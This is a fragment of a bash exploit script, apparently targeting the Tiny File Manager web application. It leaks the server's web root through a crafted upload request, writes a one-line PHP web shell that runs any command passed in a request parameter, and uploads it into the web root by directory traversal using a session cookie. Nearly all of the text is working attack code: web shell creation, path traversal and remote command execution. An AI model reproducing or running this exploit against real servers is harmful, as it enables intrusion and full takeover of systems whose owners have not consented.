...
webroot=$(curl --proxy "http://127.0.0.1:8080" -X POST "$URL?p=&upload" -d "type=upload&uploadurl=http://vyvyuytcuytcuycuytuy/&ajax=true" -H "Cookie: $cookie" -s | jq | grep file | tr -d '"' | tr -d "," | tr -d " " | sed s/"file:"//g | tr "/" "\n" | head --lines=-1 | tr "\n" "/" )
...
#webroot="/var/www/html/"
shell="shell_tinyfile.php"
echo "<?php system(\$_REQUEST['cmd']); ?>" > /tmp/$shell



curl --proxy "http://127.0.0.1:8080" $URL?p=tiny/uploads -X POST -s -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -b $cookie -F "p=tiny/uploads" -F "fullpath=../../../../../../../..${webroot}/${shell}" -F "file=@/tmp/$shell" | grep "successful"
